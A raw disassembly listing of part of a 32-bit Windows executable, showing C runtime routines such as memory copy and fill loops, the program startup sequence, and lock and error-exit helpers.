  402f50:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402f52:	ff 24 95 08 30 40 00 	jmp    *0x403008(,%edx,4)
  402f59:	8d 49 00             	lea    0x0(%ecx),%ecx
  402f5c:	23 d1                	and    %ecx,%edx
  402f5e:	8a 06                	mov    (%esi),%al
  402f60:	88 07                	mov    %al,(%edi)
  402f62:	8a 46 01             	mov    0x1(%esi),%al
  402f65:	c1 e9 02             	shr    $0x2,%ecx
  402f68:	88 47 01             	mov    %al,0x1(%edi)
  402f6b:	83 c6 02             	add    $0x2,%esi
  402f6e:	83 c7 02             	add    $0x2,%edi
  402f71:	83 f9 08             	cmp    $0x8,%ecx
  402f74:	72 a6                	jb     0x402f1c
  402f76:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402f78:	ff 24 95 08 30 40 00 	jmp    *0x403008(,%edx,4)
  402f7f:	90                   	nop
  402f80:	23 d1                	and    %ecx,%edx
  402f82:	8a 06                	mov    (%esi),%al
  402f84:	88 07                	mov    %al,(%edi)
  402f86:	46                   	inc    %esi
  402f87:	c1 e9 02             	shr    $0x2,%ecx
  402f8a:	47                   	inc    %edi
  402f8b:	83 f9 08             	cmp    $0x8,%ecx
  402f8e:	72 8c                	jb     0x402f1c
  402f90:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402f92:	ff 24 95 08 30 40 00 	jmp    *0x403008(,%edx,4)
  402f99:	8d 49 00             	lea    0x0(%ecx),%ecx
  402f9c:	ff 2f                	ljmp   *(%edi)
  402f9e:	40                   	inc    %eax
  402f9f:	00 ec                	add    %ch,%ah
  402fa1:	2f                   	das
  402fa2:	40                   	inc    %eax
  402fa3:	00 e4                	add    %ah,%ah
  402fa5:	2f                   	das
  402fa6:	40                   	inc    %eax
  402fa7:	00 dc                	add    %bl,%ah
  402fa9:	2f                   	das
  402faa:	40                   	inc    %eax
  402fab:	00 d4                	add    %dl,%ah
  402fad:	2f                   	das
  402fae:	40                   	inc    %eax
  402faf:	00 cc                	add    %cl,%ah
  402fb1:	2f                   	das
  402fb2:	40                   	inc    %eax
  402fb3:	00 c4                	add    %al,%ah
  402fb5:	2f                   	das
  402fb6:	40                   	inc    %eax
  402fb7:	00 bc 2f 40 00 8b 44 	add    %bh,0x448b0040(%edi,%ebp,1)
  402fbe:	8e e4                	mov    %esp,%fs
  402fc0:	89 44 8f e4          	mov    %eax,-0x1c(%edi,%ecx,4)
  402fc4:	8b 44 8e e8          	mov    -0x18(%esi,%ecx,4),%eax
  402fc8:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  402fcc:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  402fd0:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  402fd4:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  402fd8:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  402fdc:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  402fe0:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  402fe4:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  402fe8:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  402fec:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  402ff0:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  402ff4:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  402ffb:	03 f0                	add    %eax,%esi
  402ffd:	03 f8                	add    %eax,%edi
  402fff:	ff 24 95 08 30 40 00 	jmp    *0x403008(,%edx,4)
  403006:	8b ff                	mov    %edi,%edi
  403008:	18 30                	sbb    %dh,(%eax)
  40300a:	40                   	inc    %eax
  40300b:	00 20                	add    %ah,(%eax)
  40300d:	30 40 00             	xor    %al,0x0(%eax)
  403010:	2c 30                	sub    $0x30,%al
  403012:	40                   	inc    %eax
  403013:	00 40 30             	add    %al,0x30(%eax)
  403016:	40                   	inc    %eax
  403017:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  40301d:	c9                   	leave
  40301e:	c3                   	ret
  40301f:	90                   	nop
  403020:	8a 06                	mov    (%esi),%al
  403022:	88 07                	mov    %al,(%edi)
  403024:	8b 45 08             	mov    0x8(%ebp),%eax
  403027:	5e                   	pop    %esi
  403028:	5f                   	pop    %edi
  403029:	c9                   	leave
  40302a:	c3                   	ret
  40302b:	90                   	nop
  40302c:	8a 06                	mov    (%esi),%al
  40302e:	88 07                	mov    %al,(%edi)
  403030:	8a 46 01             	mov    0x1(%esi),%al
  403033:	88 47 01             	mov    %al,0x1(%edi)
  403036:	8b 45 08             	mov    0x8(%ebp),%eax
  403039:	5e                   	pop    %esi
  40303a:	5f                   	pop    %edi
  40303b:	c9                   	leave
  40303c:	c3                   	ret
  40303d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403040:	8a 06                	mov    (%esi),%al
  403042:	88 07                	mov    %al,(%edi)
  403044:	8a 46 01             	mov    0x1(%esi),%al
  403047:	88 47 01             	mov    %al,0x1(%edi)
  40304a:	8a 46 02             	mov    0x2(%esi),%al
  40304d:	88 47 02             	mov    %al,0x2(%edi)
  403050:	8b 45 08             	mov    0x8(%ebp),%eax
  403053:	5e                   	pop    %esi
  403054:	5f                   	pop    %edi
  403055:	c9                   	leave
  403056:	c3                   	ret
  403057:	90                   	nop
  403058:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  40305c:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  403060:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403066:	75 24                	jne    0x40308c
  403068:	c1 e9 02             	shr    $0x2,%ecx
  40306b:	83 e2 03             	and    $0x3,%edx
  40306e:	83 f9 08             	cmp    $0x8,%ecx
  403071:	72 0d                	jb     0x403080
  403073:	fd                   	std
  403074:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403076:	fc                   	cld
  403077:	ff 24 95 a0 31 40 00 	jmp    *0x4031a0(,%edx,4)
  40307e:	8b ff                	mov    %edi,%edi
  403080:	f7 d9                	neg    %ecx
  403082:	ff 24 8d 50 31 40 00 	jmp    *0x403150(,%ecx,4)
  403089:	8d 49 00             	lea    0x0(%ecx),%ecx
  40308c:	8b c7                	mov    %edi,%eax
  40308e:	ba 03 00 00 00       	mov    $0x3,%edx
  403093:	83 f9 04             	cmp    $0x4,%ecx
  403096:	72 0c                	jb     0x4030a4
  403098:	83 e0 03             	and    $0x3,%eax
  40309b:	2b c8                	sub    %eax,%ecx
  40309d:	ff 24 85 a8 30 40 00 	jmp    *0x4030a8(,%eax,4)
  4030a4:	ff 24 8d a0 31 40 00 	jmp    *0x4031a0(,%ecx,4)
  4030ab:	90                   	nop
  4030ac:	b8 30 40 00 d8       	mov    $0xd8004030,%eax
  4030b1:	30 40 00             	xor    %al,0x0(%eax)
  4030b4:	00 31                	add    %dh,(%ecx)
  4030b6:	40                   	inc    %eax
  4030b7:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  4030bd:	88 47 03             	mov    %al,0x3(%edi)
  4030c0:	4e                   	dec    %esi
  4030c1:	c1 e9 02             	shr    $0x2,%ecx
  4030c4:	4f                   	dec    %edi
  4030c5:	83 f9 08             	cmp    $0x8,%ecx
  4030c8:	72 b6                	jb     0x403080
  4030ca:	fd                   	std
  4030cb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4030cd:	fc                   	cld
  4030ce:	ff 24 95 a0 31 40 00 	jmp    *0x4031a0(,%edx,4)
  4030d5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4030d8:	8a 46 03             	mov    0x3(%esi),%al
  4030db:	23 d1                	and    %ecx,%edx
  4030dd:	88 47 03             	mov    %al,0x3(%edi)
  4030e0:	8a 46 02             	mov    0x2(%esi),%al
  4030e3:	c1 e9 02             	shr    $0x2,%ecx
  4030e6:	88 47 02             	mov    %al,0x2(%edi)
  4030e9:	83 ee 02             	sub    $0x2,%esi
  4030ec:	83 ef 02             	sub    $0x2,%edi
  4030ef:	83 f9 08             	cmp    $0x8,%ecx
  4030f2:	72 8c                	jb     0x403080
  4030f4:	fd                   	std
  4030f5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4030f7:	fc                   	cld
  4030f8:	ff 24 95 a0 31 40 00 	jmp    *0x4031a0(,%edx,4)
  4030ff:	90                   	nop
  403100:	8a 46 03             	mov    0x3(%esi),%al
  403103:	23 d1                	and    %ecx,%edx
  403105:	88 47 03             	mov    %al,0x3(%edi)
  403108:	8a 46 02             	mov    0x2(%esi),%al
  40310b:	88 47 02             	mov    %al,0x2(%edi)
  40310e:	8a 46 01             	mov    0x1(%esi),%al
  403111:	c1 e9 02             	shr    $0x2,%ecx
  403114:	88 47 01             	mov    %al,0x1(%edi)
  403117:	83 ee 03             	sub    $0x3,%esi
  40311a:	83 ef 03             	sub    $0x3,%edi
  40311d:	83 f9 08             	cmp    $0x8,%ecx
  403120:	0f 82 5a ff ff ff    	jb     0x403080
  403126:	fd                   	std
  403127:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403129:	fc                   	cld
  40312a:	ff 24 95 a0 31 40 00 	jmp    *0x4031a0(,%edx,4)
  403131:	8d 49 00             	lea    0x0(%ecx),%ecx
  403134:	54                   	push   %esp
  403135:	31 40 00             	xor    %eax,0x0(%eax)
  403138:	5c                   	pop    %esp
  403139:	31 40 00             	xor    %eax,0x0(%eax)
  40313c:	64 31 40 00          	xor    %eax,%fs:0x0(%eax)
  403140:	6c                   	insb   (%dx),%es:(%edi)
  403141:	31 40 00             	xor    %eax,0x0(%eax)
  403144:	74 31                	je     0x403177
  403146:	40                   	inc    %eax
  403147:	00 7c 31 40          	add    %bh,0x40(%ecx,%esi,1)
  40314b:	00 84 31 40 00 97 31 	add    %al,0x31970040(%ecx,%esi,1)
  403152:	40                   	inc    %eax
  403153:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  403159:	44                   	inc    %esp
  40315a:	8f                   	(bad)
  40315b:	1c 8b                	sbb    $0x8b,%al
  40315d:	44                   	inc    %esp
  40315e:	8e 18                	mov    (%eax),%ds
  403160:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  403164:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  403168:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40316c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  403170:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  403174:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  403178:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40317c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  403180:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  403184:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  403188:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40318c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  403193:	03 f0                	add    %eax,%esi
  403195:	03 f8                	add    %eax,%edi
  403197:	ff 24 95 a0 31 40 00 	jmp    *0x4031a0(,%edx,4)
  40319e:	8b ff                	mov    %edi,%edi
  4031a0:	b0 31                	mov    $0x31,%al
  4031a2:	40                   	inc    %eax
  4031a3:	00 b8 31 40 00 c8    	add    %bh,-0x37ffbfcf(%eax)
  4031a9:	31 40 00             	xor    %eax,0x0(%eax)
  4031ac:	dc 31                	fdivl  (%ecx)
  4031ae:	40                   	inc    %eax
  4031af:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4031b5:	c9                   	leave
  4031b6:	c3                   	ret
  4031b7:	90                   	nop
  4031b8:	8a 46 03             	mov    0x3(%esi),%al
  4031bb:	88 47 03             	mov    %al,0x3(%edi)
  4031be:	8b 45 08             	mov    0x8(%ebp),%eax
  4031c1:	5e                   	pop    %esi
  4031c2:	5f                   	pop    %edi
  4031c3:	c9                   	leave
  4031c4:	c3                   	ret
  4031c5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4031c8:	8a 46 03             	mov    0x3(%esi),%al
  4031cb:	88 47 03             	mov    %al,0x3(%edi)
  4031ce:	8a 46 02             	mov    0x2(%esi),%al
  4031d1:	88 47 02             	mov    %al,0x2(%edi)
  4031d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4031d7:	5e                   	pop    %esi
  4031d8:	5f                   	pop    %edi
  4031d9:	c9                   	leave
  4031da:	c3                   	ret
  4031db:	90                   	nop
  4031dc:	8a 46 03             	mov    0x3(%esi),%al
  4031df:	88 47 03             	mov    %al,0x3(%edi)
  4031e2:	8a 46 02             	mov    0x2(%esi),%al
  4031e5:	88 47 02             	mov    %al,0x2(%edi)
  4031e8:	8a 46 01             	mov    0x1(%esi),%al
  4031eb:	88 47 01             	mov    %al,0x1(%edi)
  4031ee:	8b 45 08             	mov    0x8(%ebp),%eax
  4031f1:	5e                   	pop    %esi
  4031f2:	5f                   	pop    %edi
  4031f3:	c9                   	leave
  4031f4:	c3                   	ret
  4031f5:	cc                   	int3
  4031f6:	cc                   	int3
  4031f7:	cc                   	int3
  4031f8:	cc                   	int3
  4031f9:	cc                   	int3
  4031fa:	cc                   	int3
  4031fb:	cc                   	int3
  4031fc:	cc                   	int3
  4031fd:	cc                   	int3
  4031fe:	cc                   	int3
  4031ff:	cc                   	int3
  403200:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403204:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403208:	85 d2                	test   %edx,%edx
  40320a:	74 47                	je     0x403253
  40320c:	33 c0                	xor    %eax,%eax
  40320e:	8a 44 24 08          	mov    0x8(%esp),%al
  403212:	57                   	push   %edi
  403213:	8b f9                	mov    %ecx,%edi
  403215:	83 fa 04             	cmp    $0x4,%edx
  403218:	72 2d                	jb     0x403247
  40321a:	f7 d9                	neg    %ecx
  40321c:	83 e1 03             	and    $0x3,%ecx
  40321f:	74 08                	je     0x403229
  403221:	2b d1                	sub    %ecx,%edx
  403223:	88 07                	mov    %al,(%edi)
  403225:	47                   	inc    %edi
  403226:	49                   	dec    %ecx
  403227:	75 fa                	jne    0x403223
  403229:	8b c8                	mov    %eax,%ecx
  40322b:	c1 e0 08             	shl    $0x8,%eax
  40322e:	03 c1                	add    %ecx,%eax
  403230:	8b c8                	mov    %eax,%ecx
  403232:	c1 e0 10             	shl    $0x10,%eax
  403235:	03 c1                	add    %ecx,%eax
  403237:	8b ca                	mov    %edx,%ecx
  403239:	83 e2 03             	and    $0x3,%edx
  40323c:	c1 e9 02             	shr    $0x2,%ecx
  40323f:	74 06                	je     0x403247
  403241:	f3 ab                	rep stos %eax,%es:(%edi)
  403243:	85 d2                	test   %edx,%edx
  403245:	74 06                	je     0x40324d
  403247:	88 07                	mov    %al,(%edi)
  403249:	47                   	inc    %edi
  40324a:	4a                   	dec    %edx
  40324b:	75 fa                	jne    0x403247
  40324d:	8b 44 24 08          	mov    0x8(%esp),%eax
  403251:	5f                   	pop    %edi
  403252:	c3                   	ret
  403253:	8b 44 24 04          	mov    0x4(%esp),%eax
  403257:	c3                   	ret
  403258:	cc                   	int3
  403259:	cc                   	int3
  40325a:	cc                   	int3
  40325b:	cc                   	int3
  40325c:	cc                   	int3
  40325d:	cc                   	int3
  40325e:	cc                   	int3
  40325f:	cc                   	int3
  403260:	55                   	push   %ebp
  403261:	8b ec                	mov    %esp,%ebp
  403263:	6a ff                	push   $0xffffffff
  403265:	68 28 f1 40 00       	push   $0x40f128
  40326a:	68 f8 5a 40 00       	push   $0x405af8
  40326f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403275:	50                   	push   %eax
  403276:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40327d:	83 c4 a4             	add    $0xffffffa4,%esp
  403280:	53                   	push   %ebx
  403281:	56                   	push   %esi
  403282:	57                   	push   %edi
  403283:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403286:	ff 15 28 f0 40 00    	call   *0x40f028
  40328c:	a3 e0 dc 45 00       	mov    %eax,0x45dce0
  403291:	a1 e0 dc 45 00       	mov    0x45dce0,%eax
  403296:	c1 e8 08             	shr    $0x8,%eax
  403299:	25 ff 00 00 00       	and    $0xff,%eax
  40329e:	a3 ec dc 45 00       	mov    %eax,0x45dcec
  4032a3:	8b 0d e0 dc 45 00    	mov    0x45dce0,%ecx
  4032a9:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4032af:	89 0d e8 dc 45 00    	mov    %ecx,0x45dce8
  4032b5:	8b 15 e8 dc 45 00    	mov    0x45dce8,%edx
  4032bb:	c1 e2 08             	shl    $0x8,%edx
  4032be:	03 15 ec dc 45 00    	add    0x45dcec,%edx
  4032c4:	89 15 e4 dc 45 00    	mov    %edx,0x45dce4
  4032ca:	a1 e0 dc 45 00       	mov    0x45dce0,%eax
  4032cf:	c1 e8 10             	shr    $0x10,%eax
  4032d2:	25 ff ff 00 00       	and    $0xffff,%eax
  4032d7:	a3 e0 dc 45 00       	mov    %eax,0x45dce0
  4032dc:	6a 01                	push   $0x1
  4032de:	e8 7d 27 00 00       	call   0x405a60
  4032e3:	83 c4 04             	add    $0x4,%esp
  4032e6:	85 c0                	test   %eax,%eax
  4032e8:	75 0a                	jne    0x4032f4
  4032ea:	6a 1c                	push   $0x1c
  4032ec:	e8 0f 01 00 00       	call   0x403400
  4032f1:	83 c4 04             	add    $0x4,%esp
  4032f4:	e8 77 11 00 00       	call   0x404470
  4032f9:	85 c0                	test   %eax,%eax
  4032fb:	75 0a                	jne    0x403307
  4032fd:	6a 10                	push   $0x10
  4032ff:	e8 fc 00 00 00       	call   0x403400
  403304:	83 c4 04             	add    $0x4,%esp
  403307:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40330e:	e8 8d 21 00 00       	call   0x4054a0
  403313:	ff 15 24 f0 40 00    	call   *0x40f024
  403319:	a3 78 f3 45 00       	mov    %eax,0x45f378
  40331e:	e8 5d 1f 00 00       	call   0x405280
  403323:	a3 68 dc 45 00       	mov    %eax,0x45dc68
  403328:	e8 43 1a 00 00       	call   0x404d70
  40332d:	e8 ee 18 00 00       	call   0x404c20
  403332:	e8 49 14 00 00       	call   0x404780
  403337:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  40333e:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403341:	51                   	push   %ecx
  403342:	ff 15 20 f0 40 00    	call   *0x40f020
  403348:	e8 13 18 00 00       	call   0x404b60
  40334d:	89 45 9c             	mov    %eax,-0x64(%ebp)
  403350:	8b 55 d0             	mov    -0x30(%ebp),%edx
  403353:	83 e2 01             	and    $0x1,%edx
  403356:	85 d2                	test   %edx,%edx
  403358:	74 0d                	je     0x403367
  40335a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40335d:	25 ff ff 00 00       	and    $0xffff,%eax
  403362:	89 45 94             	mov    %eax,-0x6c(%ebp)
  403365:	eb 07                	jmp    0x40336e
  403367:	c7 45 94 0a 00 00 00 	movl   $0xa,-0x6c(%ebp)
  40336e:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  403371:	51                   	push   %ecx
  403372:	8b 55 9c             	mov    -0x64(%ebp),%edx
  403375:	52                   	push   %edx
  403376:	6a 00                	push   $0x0
  403378:	6a 00                	push   $0x0
  40337a:	ff 15 1c f0 40 00    	call   *0x40f01c
  403380:	50                   	push   %eax
  403381:	e8 c9 f5 ff ff       	call   0x40294f
  403386:	89 45 a0             	mov    %eax,-0x60(%ebp)
  403389:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40338c:	50                   	push   %eax
  40338d:	e8 2e 14 00 00       	call   0x4047c0
  403392:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403395:	8b 11                	mov    (%ecx),%edx
  403397:	8b 02                	mov    (%edx),%eax
  403399:	89 45 98             	mov    %eax,-0x68(%ebp)
  40339c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40339f:	51                   	push   %ecx
  4033a0:	8b 55 98             	mov    -0x68(%ebp),%edx
  4033a3:	52                   	push   %edx
  4033a4:	e8 97 15 00 00       	call   0x404940
  4033a9:	83 c4 08             	add    $0x8,%esp
  4033ac:	c3                   	ret
  4033ad:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4033b0:	8b 45 98             	mov    -0x68(%ebp),%eax
  4033b3:	50                   	push   %eax
  4033b4:	e8 27 14 00 00       	call   0x4047e0
  4033b9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4033bc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4033c3:	5f                   	pop    %edi
  4033c4:	5e                   	pop    %esi
  4033c5:	5b                   	pop    %ebx
  4033c6:	8b e5                	mov    %ebp,%esp
  4033c8:	5d                   	pop    %ebp
  4033c9:	c3                   	ret
  4033ca:	cc                   	int3
  4033cb:	cc                   	int3
  4033cc:	cc                   	int3
  4033cd:	cc                   	int3
  4033ce:	cc                   	int3
  4033cf:	cc                   	int3
  4033d0:	55                   	push   %ebp
  4033d1:	8b ec                	mov    %esp,%ebp
  4033d3:	83 3d 70 dc 45 00 01 	cmpl   $0x1,0x45dc70
  4033da:	75 05                	jne    0x4033e1
  4033dc:	e8 ef 27 00 00       	call   0x405bd0
  4033e1:	8b 45 08             	mov    0x8(%ebp),%eax
  4033e4:	50                   	push   %eax
  4033e5:	e8 36 28 00 00       	call   0x405c20
  4033ea:	83 c4 04             	add    $0x4,%esp
  4033ed:	68 ff 00 00 00       	push   $0xff
  4033f2:	ff 15 60 af 45 00    	call   *0x45af60
  4033f8:	83 c4 04             	add    $0x4,%esp
  4033fb:	5d                   	pop    %ebp
  4033fc:	c3                   	ret
  4033fd:	cc                   	int3
  4033fe:	cc                   	int3
  4033ff:	cc                   	int3
  403400:	55                   	push   %ebp
  403401:	8b ec                	mov    %esp,%ebp
  403403:	83 3d 70 dc 45 00 01 	cmpl   $0x1,0x45dc70
  40340a:	75 05                	jne    0x403411
  40340c:	e8 bf 27 00 00       	call   0x405bd0
  403411:	8b 45 08             	mov    0x8(%ebp),%eax
  403414:	50                   	push   %eax
  403415:	e8 06 28 00 00       	call   0x405c20
  40341a:	83 c4 04             	add    $0x4,%esp
  40341d:	68 ff 00 00 00       	push   $0xff
  403422:	ff 15 2c f0 40 00    	call   *0x40f02c
  403428:	5d                   	pop    %ebp
  403429:	c3                   	ret
  40342a:	cc                   	int3
  40342b:	cc                   	int3
  40342c:	cc                   	int3
  40342d:	cc                   	int3
  40342e:	cc                   	int3
  40342f:	cc                   	int3
  403430:	55                   	push   %ebp
  403431:	8b ec                	mov    %esp,%ebp
  403433:	a1 ac af 45 00       	mov    0x45afac,%eax
  403438:	50                   	push   %eax
  403439:	ff 15 30 f0 40 00    	call   *0x40f030
  40343f:	8b 0d 9c af 45 00    	mov    0x45af9c,%ecx
  403445:	51                   	push   %ecx
  403446:	ff 15 30 f0 40 00    	call   *0x40f030
  40344c:	8b 15 8c af 45 00    	mov    0x45af8c,%edx
  403452:	52                   	push   %edx
  403453:	ff 15 30 f0 40 00    	call   *0x40f030
  403459:	a1 6c af 45 00       	mov    0x45af6c,%eax
  40345e:	50                   	push   %eax
  40345f:	ff 15 30 f0 40 00    	call   *0x40f030
  403465:	5d                   	pop    %ebp
  403466:	c3                   	ret
  403467:	cc                   	int3
  403468:	cc                   	int3
  403469:	cc                   	int3
  40346a:	cc                   	int3
  40346b:	cc                   	int3
  40346c:	cc                   	int3
  40346d:	cc                   	int3
  40346e:	cc                   	int3
  40346f:	cc                   	int3
  403470:	55                   	push   %ebp
  403471:	8b ec                	mov    %esp,%ebp
  403473:	51                   	push   %ecx
  403474:	8b 45 08             	mov    0x8(%ebp),%eax
  403477:	83 3c 85 68 af 45 00 	cmpl   $0x0,0x45af68(,%eax,4)
  40347e:	00 
  40347f:	75 71                	jne    0x4034f2
  403481:	68 e1 00 00 00       	push   $0xe1
  403486:	68 34 f1 40 00       	push   $0x40f134
  40348b:	6a 02                	push   $0x2
  40348d:	6a 18                	push   $0x18
  40348f:	e8 4c 29 00 00       	call   0x405de0
  403494:	83 c4 10             	add    $0x10,%esp
  403497:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40349a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40349e:	75 0a                	jne    0x4034aa
  4034a0:	6a 11                	push   $0x11
  4034a2:	e8 29 ff ff ff       	call   0x4033d0
  4034a7:	83 c4 04             	add    $0x4,%esp
  4034aa:	6a 11                	push   $0x11
  4034ac:	e8 bf ff ff ff       	call   0x403470
  4034b1:	83 c4 04             	add    $0x4,%esp
  4034b4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4034b7:	83 3c 8d 68 af 45 00 	cmpl   $0x0,0x45af68(,%ecx,4)
  4034be:	00 
  4034bf:	75 19                	jne    0x4034da
  4034c1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4034c4:	52                   	push   %edx
  4034c5:	ff 15 30 f0 40 00    	call   *0x40f030
  4034cb:	8b 45 08             	mov    0x8(%ebp),%eax
  4034ce:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4034d1:	89 0c 85 68 af 45 00 	mov    %ecx,0x45af68(,%eax,4)
  4034d8:	eb 0e                	jmp    0x4034e8
  4034da:	6a 02                	push   $0x2
  4034dc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4034df:	52                   	push   %edx
  4034e0:	e8 4b 2d 00 00       	call   0x406230
  4034e5:	83 c4 08             	add    $0x8,%esp
  4034e8:	6a 11                	push   $0x11
  4034ea:	e8 21 00 00 00       	call   0x403510
  4034ef:	83 c4 04             	add    $0x4,%esp
  4034f2:	8b 45 08             	mov    0x8(%ebp),%eax
  4034f5:	8b 0c 85 68 af 45 00 	mov    0x45af68(,%eax,4),%ecx
  4034fc:	51                   	push   %ecx
  4034fd:	ff 15 38 f0 40 00    	call   *0x40f038
  403503:	8b e5                	mov    %ebp,%esp
  403505:	5d                   	pop    %ebp
  403506:	c3                   	ret
  403507:	cc                   	int3
  403508:	cc                   	int3
  403509:	cc                   	int3
  40350a:	cc                   	int3
  40350b:	cc                   	int3
  40350c:	cc                   	int3
  40350d:	cc                   	int3
  40350e:	cc                   	int3
  40350f:	cc                   	int3
  403510:	55                   	push   %ebp
  403511:	8b ec                	mov    %esp,%ebp
  403513:	8b 45 08             	mov    0x8(%ebp),%eax
  403516:	8b 0c 85 68 af 45 00 	mov    0x45af68(,%eax,4),%ecx
  40351d:	51                   	push   %ecx
  40351e:	ff 15 3c f0 40 00    	call   *0x40f03c
  403524:	5d                   	pop    %ebp
  403525:	c3                   	ret
  403526:	cc                   	int3
  403527:	cc                   	int3
  403528:	cc                   	int3
  403529:	cc                   	int3
  40352a:	cc                   	int3
  40352b:	cc                   	int3
  40352c:	cc                   	int3
  40352d:	cc                   	int3
  40352e:	cc                   	int3
  40352f:	cc                   	int3
  403530:	55                   	push   %ebp
  403531:	8b ec                	mov    %esp,%ebp
  403533:	6a ff                	push   $0xffffffff
  403535:	68 40 f1 40 00       	push   $0x40f140
  40353a:	68 f8 5a 40 00       	push   $0x405af8
  40353f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403545:	50                   	push   %eax
  403546:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40354d:	83 c4 e8             	add    $0xffffffe8,%esp
  403550:	53                   	push   %ebx
  403551:	56                   	push   %esi
  403552:	57                   	push   %edi
  403553:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403557:	75 05                	jne    0x40355e
  403559:	e9 07 01 00 00       	jmp    0x403665
  40355e:	83 3d 50 f2 45 00 03 	cmpl   $0x3,0x45f250
  403565:	75 6d                	jne    0x4035d4
  403567:	6a 09                	push   $0x9
  403569:	e8 02 ff ff ff       	call   0x403470
  40356e:	83 c4 04             	add    $0x4,%esp
  403571:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403578:	8b 45 08             	mov    0x8(%ebp),%eax
  40357b:	50                   	push   %eax
  40357c:	e8 bf 3d 00 00       	call   0x407340
  403581:	83 c4 04             	add    $0x4,%esp
  403584:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403587:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40358b:	74 10                	je     0x40359d
  40358d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403590:	51                   	push   %ecx
  403591:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403594:	52                   	push   %edx
  403595:	e8 66 3e 00 00       	call   0x407400
  40359a:	83 c4 08             	add    $0x8,%esp
  40359d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4035a4:	e8 02 00 00 00       	call   0x4035ab
  4035a9:	eb 0b                	jmp    0x4035b6
  4035ab:	6a 09                	push   $0x9
  4035ad:	e8 5e ff ff ff       	call   0x403510
  4035b2:	83 c4 04             	add    $0x4,%esp
  4035b5:	c3                   	ret
  4035b6:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4035ba:	75 13                	jne    0x4035cf
  4035bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4035bf:	50                   	push   %eax
  4035c0:	6a 00                	push   $0x0
  4035c2:	8b 0d 4c f2 45 00    	mov    0x45f24c,%ecx
  4035c8:	51                   	push   %ecx
  4035c9:	ff 15 40 f0 40 00    	call   *0x40f040
  4035cf:	e9 91 00 00 00       	jmp    0x403665
